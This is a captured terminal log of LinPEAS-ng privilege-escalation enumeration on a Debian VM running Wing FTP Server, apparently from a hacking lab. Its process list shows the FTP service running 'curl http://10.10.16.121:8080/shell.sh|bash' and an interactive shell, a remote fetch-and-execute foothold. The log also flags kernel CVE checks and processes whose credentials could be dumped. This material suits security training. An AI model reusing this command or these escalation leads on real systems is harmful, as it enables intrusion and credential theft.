[48;2;74;217;38m[38;2;73;217;37m▄[48;2;114;194;86m[38;2;76;215;40m▄[48;2;142;178;121m[38;2;94;205;62m▄[48;2;150;176;129m[38;2;109;196;81m▄[48;2;142;180;120m[38;2;95;203;63m▄[48;2;116;193;88m[38;2;76;214;41m▄[48;2;78;213;44m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;67;196;36m▄[48;2;71;209;37m[38;2;60;154;36m▄[48;2;59;152;36m[38;2;57;138;37m▄[48;2;52;110;38m[38;2;56;130;37m▄[48;2;51;104;38m[38;2;30;71;21m▄[48;2;20;31;17m[38;2;45;69;39m▄[48;2;50;78;44m[38;2;51;78;45m▄[48;2;51;78;45m [0m
         [48;2;51;78;45m[38;2;28;43;24m▄[48;2;51;78;45m[38;2;43;64;38m▄[48;2;51;78;45m[38;2;52;79;46m▄[48;2;34;53;30m[38;2;46;71;41m▄[48;2;64;124;48m[38;2;49;106;36m▄[48;2;53;115;38m[38;2;57;124;40m▄[48;2;63;175;36m[38;2;55;126;38m▄[48;2;73;217;37m[38;2;66;186;36m▄[48;2;89;208;56m[38;2;73;217;37m▄[48;2;111;195;82m[38;2;75;215;40m▄[48;2;109;197;80m[38;2;74;216;38m▄[48;2;85;209;52m[38;2;73;218;36m▄[48;2;73;216;37m[38;2;73;218;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;37m[38;2;73;218;37m▄[48;2;73;217;36m[38;2;73;218;37m▄[48;2;73;218;37m[38;2;71;214;36m▄[48;2;71;212;36m[38;2;63;172;36m▄[48;2;63;174;35m[38;2;57;138;37m▄[48;2;58;146;36m[38;2;57;137;38m▄[48;2;58;139;37m[38;2;57;138;37m▄[48;2;58;138;37m[38;2;54;128;35m▄[48;2;50;117;34m[38;2;20;44;14m▄[48;2;20;32;17m[38;2;39;61;34m▄[48;2;51;77;44m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;45;69;40m▄[48;2;51;78;45m[38;2;49;75;43m▄[0m
         [48;2;84;151;67m[38;2;98;177;78m▄[48;2;43;80;34m[38;2;98;177;78m▄[48;2;22;39;19m[38;2;98;178;78m▄[48;2;43;67;38m[38;2;81;148;64m▄[48;2;40;70;33m[38;2;44;78;36m▄[48;2;54;127;36m[38;2;21;47;15m▄[48;2;55;120;39m[38;2;54;117;39m▄[48;2;56;133;37m[38;2;59;133;40m▄[48;2;71;211;36m[38;2;61;164;37m▄[48;2;73;217;36m[38;2;71;211;36m▄[48;2;73;218;37m[38;2;72;218;36m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;72;217;36m▄[48;2;73;218;37m[38;2;67;203;34m▄[48;2;68;194;37m[38;2;40;116;21m▄[48;2;58;142;36m[38;2;8;21;5m▄[48;2;49;120;31m[38;2;6;10;5m▄[48;2;25;59;16m[38;2;73;108;65m▄[48;2;15;33;11m[38;2;95;157;79m▄[48;2;12;25;9m[38;2;97;175;77m▄[48;2;21;32;19m[38;2;99;179;79m▄[48;2;23;35;19m[38;2;98;178;78m▄[48;2;20;34;17m[38;2;98;178;78m▄[48;2;13;24;11m[38;2;98;178;78m▄[48;2;16;26;14m[38;2;98;177;78m▄[0m
         [48;2;97;176;77m[38;2;58;103;46m▄[48;2;98;177;78m[38;2;94;170;75m▄[48;2;98;177;78m[38;2;99;179;79m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;97;176;77m[38;2;98;177;78m▄[48;2;91;165;72m[38;2;98;177;78m▄[48;2;55;100;44m[38;2;98;177;78m▄[48;2;15;27;10m[38;2;92;168;73m▄[48;2;24;46;18m[38;2;76;138;61m▄[48;2;73;154;53m[38;2;54;96;43m▄[48;2;74;213;39m[38;2;24;48;18m▄[48;2;74;222;37m[38;2;20;55;11m▄[48;2;73;217;37m[38;2;31;91;16m▄[48;2;73;218;37m[38;2;49;145;24m▄[48;2;73;218;37m[38;2;68;201;35m▄[48;2;73;218;37m[38;2;73;217;37m▄[48;2;73;218;37m[38;2;74;220;37m▄[48;2;73;218;37m[38;2;73;219;37m▄[48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m [48;2;73;218;37m[38;2;73;220;37m▄[48;2;73;218;37m[38;2;72;214;37m▄[48;2;73;218;37m[38;2;63;187;32m▄[48;2;72;217;36m[38;2;41;120;22m▄[48;2;74;222;36m[38;2;21;52;13m▄[48;2;67;203;34m[38;2;39;62;34m▄[48;2;40;117;21m[38;2;64;103;54m▄[48;2;14;43;7m[38;2;72;126;57m▄[48;2;4;12;2m[38;2;87;156;69m▄[48;2;25;45;21m[38;2;97;174;78m▄[48;2;71;124;57m[38;2;99;177;80m▄[48;2;97;168;78m[38;2;94;170;75m▄[48;2;96;175;77m[38;2;103;177;84m▄[48;2;98;176;79m[38;2;109;183;90m▄[48;2;100;178;80m[38;2;112;185;94m▄[48;2;100;177;80m[38;2;111;184;92m▄[48;2;99;177;80m[38;2;107;182;89m▄[48;2;98;177;78m[38;2;105;182;85m▄[48;2;98;177;78m[38;2;103;180;83m▄[48;2;98;177;78m[38;2;99;177;79m▄[0m
          [38;2;54;79;47m▀[38;2;72;123;60m▀[48;2;97;176;78m[38;2;65;87;60m▄[48;2;98;177;78m[38;2;73;130;59m▄[48;2;98;177;78m[38;2;91;165;72m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;96;172;77m[38;2;98;177;78m▄[48;2;82;147;65m[38;2;98;177;78m▄[48;2;66;116;52m[38;2;98;177;78m▄[48;2;46;78;38m[38;2;98;177;78m▄[48;2;27;51;20m[38;2;98;177;78m▄[48;2;28;60;20m[38;2;94;169;74m▄[48;2;28;67;19m[38;2;86;155;69m▄[48;2;34;96;19m[38;2;69;123;54m▄[48;2;42;126;21m[38;2;48;86;39m▄[48;2;51;148;27m[38;2;36;64;28m▄[48;2;55;164;28m[38;2;26;46;20m▄[48;2;60;180;30m[38;2;23;39;18m▄[48;2;62;186;31m[38;2;21;40;17m▄[48;2;61;181;31m[38;2;19;36;16m▄[48;2;67;176;40m[38;2;18;32;14m▄[48;2;63;173;35m[38;2;23;36;19m▄[48;2;56;168;29m[38;2;27;42;23m▄[48;2;53;160;27m[38;2;29;45;24m▄[48;2;44;133;22m[38;2;30;53;25m▄[48;2;34;102;17m[38;2;52;89;43m▄[48;2;20;60;10m[38;2;88;148;71m▄[48;2;24;47;19m[38;2;97;171;78m▄[48;2;34;62;27m[38;2;98;177;78m▄[48;2;55;99;44m[38;2;98;177;78m▄[48;2;80;144;64m[38;2;98;177;78m▄[48;2;99;176;79m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m[38;2;99;177;79m▄[48;2;99;177;79m[38;2;96;172;76m▄[48;2;99;175;79m[38;2;85;151;68m▄[48;2;95;169;76m[38;2;72;121;60m▄[48;2;109;180;92m[38;2;37;57;32m▄[48;2;100;159;85m[38;2;38;41;36m▄[48;2;72;107;62m[38;2;74;74;74m▄[0m[38;2;44;65;38m▀[38;2;31;48;27m▀[38;2;31;48;26m▀[38;2;31;52;25m▀[38;2;41;71;34m▀[38;2;59;97;50m▀[0m
               [38;2;95;106;94m▀[38;2;81;137;65m▀[38;2;91;166;73m▀[48;2;95;174;76m[38;2;61;73;59m▄[48;2;98;177;78m[38;2;33;66;26m▄[48;2;98;177;78m[38;2;81;143;65m▄[48;2;98;177;78m[38;2;102;182;81m▄[48;2;98;177;78m[38;2;97;176;77m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m [48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;99;179;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;178;78m[38;2;98;177;78m▄[48;2;98;179;78m[38;2;98;177;78m▄[48;2;97;177;77m[38;2;98;177;78m▄[48;2;98;177;78m [48;2;98;177;78m [48;2;98;177;78m[38;2;98;176;78m▄[48;2;98;177;78m[38;2;99;179;78m▄[48;2;98;177;78m[38;2;93;169;74m▄[48;2;98;177;78m[38;2;56;106;44m▄[48;2;96;174;77m[38;2;16;31;13m▄[48;2;68;126;54m[38;2;58;58;58m▄[0m[38;2;28;50;23m▀[38;2;20;22;20m▀[0m
                     [38;2;41;52;39m▀[38;2;39;76;30m▀[38;2;73;136;57m▀[48;2;90;162;72m[38;2;96;100;95m▄[48;2;99;175;79m[38;2;60;69;58m▄[48;2;98;177;78m[38;2;46;59;43m▄[48;2;98;177;78m[38;2;32;51;27m▄[48;2;98;178;78m[38;2;28;50;23m▄[48;2;98;178;78m[38;2;28;55;22m▄[48;2;98;178;78m[38;2;35;64;28m▄[48;2;98;177;78m[38;2;41;75;33m▄[48;2;98;177;78m[38;2;50;89;41m▄[48;2;98;177;77m[38;2;54;89;45m▄[48;2;98;177;77m[38;2;53;89;44m▄[48;2;98;177;78m[38;2;49;86;39m▄[48;2;98;177;78m[38;2;45;83;36m▄[48;2;98;177;78m[38;2;40;74;32m▄[48;2;98;177;78m[38;2;35;64;28m▄[48;2;98;178;78m[38;2;39;60;33m▄[48;2;90;163;71m[38;2;55;61;53m▄[0m[38;2;53;97;41m▀[38;2;24;44;19m▀[38;2;36;41;35m▀[0m

    [1;32m/---------------------------------------------------------------------------------\
    |                             [1;34mDo you like PEASS?[1;32m                                  |
    |---------------------------------------------------------------------------------|
    |         [1;33mLinux PE & Hardening[1;32m    :     [1;31mhttps://hacktricks-training.com/courses/lhe/[1;32m |
    |         [1;33mLearn Cloud Hacking[1;32m       :     [1;31mhttps://training.hacktricks.xyz [1;32m        |
    |         [1;33mFollow on Twitter[1;32m         :     [1;31m@hacktricks_live[1;32m                        |
    |         [1;33mRespect on HTB[1;32m            :     [1;31mSirBroccoli            [1;32m                 |
    |---------------------------------------------------------------------------------|
    |                                 [1;34mThank you! [1;32m                                     |
    \---------------------------------------------------------------------------------/
[1;34m          LinPEAS-ng [1;33mby carlospolop
[0m
[1;33mADVISORY: [1;34mThis script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
[0m
[1;34mLinux Privesc Checklist: [1;33mhttps://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
[0m[1;34mBest Linux PE & Hardening course: [1;33mhttps://hacktricks-training.com/courses/lhe/
[0m [1;4mLEGEND[0m:
  [1;31;103mRED/YELLOW[0m: 95% a PE vector
  [1;31mRED[0m: You should take a look into it
  [1;96mLightCyan[0m: Users with console
  [1;34mBlue[0m: Users without console & mounted devs
  [1;32mGreen[0m: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  [1;95mLightMagenta[0m: Your username

 [1;90mStarting LinPEAS. Caching Writable Folders...[0m
[1;34m                               ╔═══════════════════╗
═══════════════════════════════╣ [1;32mBasic information[1;34m ╠═══════════════════════════════
[1;34m                               ╚═══════════════════╝[0m
[1;37mOS: [0mLinux version 6.1.0-42-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30)
[1;37mUser & Groups: [0muid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
[1;37mHostname: [0mwingdata

[1;33m[+] [1;32m/usr/bin/ping[1;34m is available for network discovery[1;37m (LinPEAS can discover hosts, learn more with -h)
[0m[1;33m[+] [1;32m/usr/bin/bash[1;34m is available for network discovery, port scanning and port forwarding[1;37m (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)
[1;33m[+] [1;32m/usr/bin/nc[1;34m is available for network discovery & port scanning[1;37m (LinPEAS can discover hosts and scan ports, learn more with -h)
[0m

[1;32mCaching directories [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0m[1;33m. [0muniq: write error: Broken pipe
[1;33mDONE
[0m
[1;34m                              ╔════════════════════╗
══════════════════════════════╣ [1;32mSystem Information[1;34m ╠══════════════════════════════
[1;34m                              ╚════════════════════╝[0m
[1;34m╔══════════╣ [1;32mOperative system [1;90m(T1082)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits
[0mLinux version 6.1.0-42-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14+deb12u1) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30)
Distributor ID:	Debian
Description:	Debian GNU/Linux 12 (bookworm)
Release:	12
Codename:	bookworm

[1;34m╔══════════╣ [1;32mSudo version [1;90m(T1548.003,T1068)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version
[0mSudo version [1;31m1.9.13[0mp3


[1;34m╔══════════╣ [1;32mPATH [1;90m(T1574.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses
[0m/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

[1;34m╔══════════╣ [1;32mDate & uptime [1;90m(T1082)
[0mSun Jun 14 02:52:31 AM EDT 2026
 02:52:31 up 7 min,  0 user,  load average: 0.22, 0.05, 0.02

[1;34m╔══════════╣ [1;32mUnmounted file-system? [1;90m(T1082,T1120)
[0m[1;34m╚ [1;34m[3mCheck if you can mount umounted devices
[0m[1;34m/dev/sda1[0m [1;34m/[0m               ext4    errors=remount-ro 0       1
[1;34m/dev[0m[1;34m/[0msda2 none            [1;32mswap[0m    sw              0       0
[1;34m/dev[0m[1;34m/[0msr0        [1;34m/[0mmedia[1;32m[1;34m/[0mcdrom[0m0   udf,iso9660[1;31m user[0m,noauto     0       0

[1;34m╔══════════╣ [1;32mAny sd*/disk* disk in /dev? (limit 20) [1;90m(T1082)
[0mdisk
sda
sda1
sda2

[1;34m╔══════════╣ [1;32mEnvironment [1;90m(T1082,T1552.007)
[0m[1;34m╚ [1;34m[3mAny private information inside environment variables?
[0mUSER=wingftp
SHLVL=1
HOME=/opt/wingftp
OLDPWD=/opt/wftpserver
LOGNAME=wingftp
_=/usr/bin/timeout
LANG=en_US.UTF-8
SHELL=/bin/bash
PWD=/tmp
PIDFILE=/opt/wftpserver/pid-wftpserver.pid

[1;34m╔══════════╣ [1;32mSearching Signature verification failed in dmesg [1;90m(T1082)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed
[0m[1;90mdmesg Not Found
[0m
[1;34m╔══════════╣ [1;32mProtections [1;90m(T1518.001)
[0m[1;34m═╣ [1;32mAppArmor enabled? .............. [0m[0mYou do not have enough privilege to read the profile set.
apparmor module is loaded.
[1;34m═╣ [1;32mAppArmor profile? .............. [0m[0m[1;31munconfined[0m
[1;34m═╣ [1;32mis linuxONE? ................... [0m[0m[1;90ms390x Not Found
[0m[1;34m═╣ [1;32mgrsecurity present? ............ [0m[0m[1;90mgrsecurity Not Found
[0m[1;34m═╣ [1;32mPaX bins present? .............. [0m[0m[1;90mPaX Not Found
[0m[1;34m═╣ [1;32mExecshield enabled? ............ [0m[0m[1;90mExecshield Not Found
[0m[1;34m═╣ [1;32mSELinux enabled? ............... [0m[0m[1;90msestatus Not Found
[0m[1;34m═╣ [1;32mSeccomp enabled? ............... [0m[0m[1;31mdisabled[0m
[1;34m═╣ [1;32mUser namespace? ................ [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32munpriv_userns_clone? ........... [0m[1;32m0[0m
[1;34m═╣ [1;32munpriv_bpf_disabled? ........... [0m[1;32m2[0m
[1;34m═╣ [1;32mCgroup2 enabled? ............... [0m[0m[1;32menabled[0m
[1;34m═╣ [1;32mkptr_restrict? ................. [0m[1;31m0[0m
[1;34m═╣ [1;32mdmesg_restrict? ................ [0m[1;32m1[0m
[1;34m═╣ [1;32mptrace_scope? .................. [0m[1;31m0[0m
[1;34m═╣ [1;32mprotected_symlinks? ............ [0m[1;32m1[0m
[1;34m═╣ [1;32mprotected_hardlinks? ........... [0m[1;32m1[0m
[1;34m═╣ [1;32mperf_event_paranoid? ........... [0m[0m[1;32m3[0m
[1;34m═╣ [1;32mmmap_min_addr? ................. [0m[1;32m65536[0m
[1;34m═╣ [1;32mlockdown mode? ................. [0m[0m[[1;31mnone[0m] [1;32mintegrity[0m [1;32mconfidentiality[0m
[1;34m═╣ [1;32mKernel hardening flags? ........ [0m[0mCONFIG_RANDOMIZE_BASE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
# CONFIG_KASAN is not set
[1;34m═╣ [1;32mIs ASLR enabled? ............... [0m[0m[1;32mYes[0m
[1;34m═╣ [1;32mPrinter? ....................... [0m[0m[1;90mNo
[0m[1;34m═╣ [1;32mIs this a virtual machine? ..... [0m[0m[1;31mYes (vmware)[0m

[1;34m╔══════════╣ [1;32mKernel Modules Information [1;90m(T1547.006)
[0m[1;34m══╣ [1;32mKernel modules with weak perms? [1;90m(T1547.006)
[0m
[1;34m══╣ [1;32mKernel modules loadable?  [1;90m(T1547.006)
[0m[1;31mModules can be loaded[0m
[1;34m══╣ [1;32mModule signature enforcement?  [1;90m(T1547.006)
[0m[1;31mNot enforced[0m

[1;34m╔══════════╣ [1;32mChecking for Copy Fail (CVE-2026-31431) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://copy.fail/
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-31431
[0m[1;32mNOT VULNERABLE: Python runtime probe left temp-file page cache intact[0m

[1;34m╔══════════╣ [1;32mKernel Exploit Registry [1;90m(T1068)
[0m[1;34m═╣ [1;32mOperating system ............. Linux
[0m[1;34m═╣ [1;32mKernel release ............... 6.1.0-42-amd64
[0m[1;34m═╣ [1;32mComparable version ........... 6.1.0.42
[0m[1;34m═╣ [1;32mData chunk limit ............. max 25 rows per KERNEL_CVE_DATA_* variable (1..21)
[0m[1;34m═╣ [1;32mKernel config source ......... /boot/config-6.1.0-42-amd64
[0m[1;32m[1;34m═╣ [1;32mNo rule matched current kernel/version prerequisites in embedded datasets.[0m
[1;32m[0m[0m
[1;34m╔══════════╣ [1;32mChecking for Dirty Frag (CVE-2026-43284 / CVE-2026-43500) [1;90m(T1068)
[0m[1;34m╚ [1;34m[3mhttps://ubuntu.com/blog/dirty-frag-linux-vulnerability-fixes-available
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-43284
[0m[1;34m╚ [1;34m[3mhttps://www.cve.org/CVERecord?id=CVE-2026-43500
[0m[1;31;103mCVE-2026-43284 (xfrm-ESP): autoloadable: esp4 esp6 xfrm_user ipcomp6[0m
[1;31;103mCVE-2026-43500 (rxrpc): autoloadable: rxrpc[0m
[1;32mmodprobe mitigation (xfrm-ESP): present[0m
[1;32mmodprobe mitigation (rxrpc): present[0m
[1;32mUnprivileged user namespaces: disabled (breaks the public PoC)[0m



[1;34m                                   ╔═══════════╗
═══════════════════════════════════╣ [1;32mContainer[1;34m ╠═══════════════════════════════════
[1;34m                                   ╚═══════════╝[0m
[1;34m╔══════════╣ [1;32mContainer related tools present (if any): [1;90m(T1613)
[0m/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

[1;34m╔══════════╣ [1;32mContainer details [1;90m(T1613,T1611)
[0m[1;34m═╣ [1;32mIs this a container? ...........[0m [1;90mNo
[0m[0m[1;34m═╣ [1;32mInteresting runtime sockets ... [0m[0m[1;34m═╣ [1;32mAny running containers? ........ [0m[0m[1;90mNo
[0m


[1;34m                                     ╔═══════╗
═════════════════════════════════════╣ [1;32mCloud[1;34m ╠═════════════════════════════════════
[1;34m                                     ╚═══════╝[0m
[1;33mLearn and practice cloud hacking techniques in [1;34mhttps://training.hacktricks.xyz
[0m
[1;34m═╣ [1;32mGCP Virtual Machine? ................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mGCP Cloud Funtion? ................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS ECS? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2? ............................. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS EC2 Beanstalk? ................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Lambda? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAWS Codebuild? ....................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mDO Droplet? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mIBM Cloud VM? ........................ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure VM or Az metadata? ............. [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure APP or IDENTITY_ENDPOINT? ...... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAzure Automation Account? ............ [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mAliyun ECS? .......................... [1;32mNo[0m
[0m[0m[1;34m═╣ [1;32mTencent CVM? ......................... [1;32mNo[0m
[0m[0m


[1;34m                ╔════════════════════════════════════════════════╗
════════════════╣ [1;32mProcesses, Crons, Timers, Services and Sockets[1;34m ╠════════════════
[1;34m                ╚════════════════════════════════════════════════╝[0m
[1;34m╔══════════╣ [1;32mRunning processes (cleaned) [1;90m(T1057)
[0m[1;34m╚ [1;34m[3mCheck weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes
[0m[1;31mroot[0m           1  0.1  0.2 102012 11952 ?        Ss   02:44   0:00 /sbin[1;32m/init[0m
[1;31mroot[0m        1566  0.4  0.7  49656 28104 ?        Ss   02:44   0:02 /lib/[1;34msys[0mtemd/systemd-journald
[1;31mroot[0m        1589  0.0  0.1  28116  7508 ?        Ss   02:44   0:00 /lib/[1;34msys[0mtemd/systemd-[1;32mudev[0md
[1;34msys[0mtemd+    2243  0.0  0.1  90104  6636 ?        Ssl  02:44   0:00 /lib/systemd/systemd-timesyncd
  └─([1;90mCaps[0m) 0x0000000002000000=cap_sys_time
[1;31mroot[0m        2379  0.2  0.0  86968  2836 ?        S<sl 02:44   0:01 /sbin/auditd
[1;34m_laurel[0m     2396  0.2  0.1   9708  6316 ?        S<   02:44   0:01  _ /usr/local/sbin/laurel --config /etc/laurel/config.toml
  └─([1;90mCaps[0m) 0x0000000000080004=[1;31mcap_dac_read_search[0m,[1;31mcap_sys_ptrace[0m
[1;31mroot[0m        2758  0.0  0.0   6616  1192 ?        Ss   02:44   0:00 /usr/sbin/[1;32mcron[0m -f
[1;32mmessage+[0m    2771  0.0  0.1   9148  4164 ?        Ss   02:44   0:00 /usr/bin/dbus-[1;34mdaemon[0m --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─([1;90mCaps[0m) 0x0000000020000000=cap_audit_write
[1;31mroot[0m        2778  0.0  0.1  16596  6816 ?        Ss   02:44   0:00 /lib/[1;34msys[0mtemd/systemd-logind
[1;31mroot[0m        3275  0.0  0.0   5876  3688 ?        Ss   02:44   0:00 dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0
[1;31mroot[0m        3367  0.5  0.2 142748 10312 ?        Sl   02:44   0:02 /usr/sbin[1;32m/vmtoolsd[0m
[1;31mroot[0m        3419  0.0  0.2  38892 10556 ?        S    02:44   0:00 /usr/lib/vmware-vgauth[1;32m/VGAuthService[0m -s
[1;31mroot[0m        3545  0.0  0.0   5880  1036 tty1     Ss+  02:44   0:00 /sbin/agetty -o -p -- u --noclear - linux
[1;96m[1;95mwingftp[0m[0m     3561  0.0  0.3 683160 12832 ?        Ssl  02:44   0:00 [1;31m/opt/wftpserver[0m/wftpserver
[1;96m[1;95mwingftp[0m[0m     3658  0.0  0.0   2584   864 ?        S    02:45   0:00  _ sh -c curl http://10.10.16.121:8080/shell.sh|bash
[1;96m[1;95mwingftp[0m[0m     3660  0.0  0.0   6940  3220 ?        S    02:45   0:00      _ bash
[1;96m[1;95mwingftp[0m[0m     3661  0.0  0.0   7204  3860 ?        S    02:45   0:00          _ bash -i
[1;96m[1;95mwingftp[0m[0m     3670  0.0  0.0   5480   884 ?        S    02:52   0:00              _ timeout 300 ./linpeas.sh
[1;96m[1;95mwingftp[0m[0m     3671  5.5  0.0   3688  2932 ?        S    02:52   0:02                  _ /bin/sh ./linpeas.sh
[1;96m[1;95mwingftp[0m[0m    19603  0.0  0.0   3688  1292 ?        S    02:53   0:00                      _ /bin/sh ./linpeas.sh
[1;96m[1;95mwingftp[0m[0m    19607  300  0.1  11092  4420 ?        R    02:53   0:00                      |   _ ps faux[1;32mwww[0m
[1;96m[1;95mwingftp[0m[0m    19606  0.0  0.0   3688  1292 ?        S    02:53   0:00                      _ /bin/sh ./linpeas.sh
[1;31mroot[0m        3570  0.0  0.1   6884  4812 ?        Ss   02:44   0:00 /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32mwww-data[0m[0m    3572  0.0  0.1 1212960 7168 ?        Sl   02:44   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start
[1;34m[1;32mwww-data[0m[0m    3573  0.0  0.1 1212984 7836 ?        Sl   02:44   0:00  _ /usr/sbin/[1;32m[1;31mapache2[0m[0m -k start

[1;34m╔══════════╣ [1;32mProcesses with unusual configurations [1;90m(T1057)
[0mProcess 3275 (root) - dhclient -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/
SELinux context: /{,usr/}sbin/dhclient (enforce)
  └─ AppArmor profile: /{,usr/}sbin/dhclient (enforce)


[1;34m╔══════════╣ [1;32mProcesses with credentials in memory (root req) [1;90m(T1003.007)
[0m[1;34m╚ [1;34m[3mhttps://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
[0m[1;90mgdm-password Not Found
[0m[1;90mgnome-keyring-daemon Not Found
[0m[1;90mlightdm Not Found
[0m[1;90mvsftpd Not Found
[0m[1;31mapache2[0m process found (dump creds from memory as root)
[1;31msshd:[0m process found (dump creds from memory as root)
[1;90mmysql Not Found
[0m[1;90mpostgres Not Found
[0m[1;90mredis-server Not Found
[0m[1;90mmongod Not Found
[0m[1;90mmemcached Not Found
[0m[1;90melasticsearch Not Found
[0m[1;90mjenkins Not Found
[0m[1;90mtomcat Not Found
[0m[1;90mnginx Not Found
[0m[1;90mphp-fpm Not Found
[0m[1;90msupervisord Not Found
[0m[1;90mvncserver Not Found
[0m[1;90mxrdp Not Found
[0m[1;90mteamviewer Not Found
[0m
[1;34m╔══════════╣ [1;32mOpened Files by processes [1;90m(T1003.007)
[0mProcess 3561 ([1;96m[1;95mwingftp[0m[0m) - /opt/wftpserver/wftpserver 
  └─ Has open files:
    └─ /opt/wftpserver/Log/audit_db
    └─ pipe:[23875]
    └─ /opt/wftpserver/Log/ssh_debug_log
    └─ /opt/wftpserver/pid-wftpserver.pid
    └─ /opt/wftpserver/Data/bookmark_db
